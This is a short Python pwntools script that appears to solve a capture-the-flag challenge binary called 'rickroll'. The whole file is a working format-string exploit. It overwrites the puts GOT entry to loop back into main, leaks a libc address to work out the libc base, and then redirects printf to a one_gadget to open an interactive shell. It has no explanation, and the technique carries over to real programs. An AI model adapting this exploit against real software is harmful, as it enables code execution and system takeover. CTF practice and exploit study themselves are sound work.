#!/usr/bin/python3

from pwn import *

r = process("./rickroll")
e = ELF("./rickroll")
libc = ELF("./libc.so.6")

context.binary = e
context.log_level = 'debug'

payload = fmtstr_payload(6, {e.got.puts:e.symbols.main+43}, write_size='short')
print(hex(e.symbols.main+43))
r.sendlineafter(b'Lyrics: ', payload)

# pause()
payload = b'::%40$p'
r.sendlineafter(b'Lyrics: ', payload)
r.recvuntil(b'::0x')
libc_start_main_234 = int(r.recvline()[:-1], 16)
print(hex(libc.symbols.__libc_start_main))
libc.address = libc_start_main_234 - 0x23c20 - 234
print(hex(libc.address))

# 0xc961a 0xc961d 0xc9620 -> one_gadget
payload = fmtstr_payload(8, {e.got.printf: libc.address+0xc9620})
r.sendlineafter(b'Lyrics: ', payload)

r.interactive()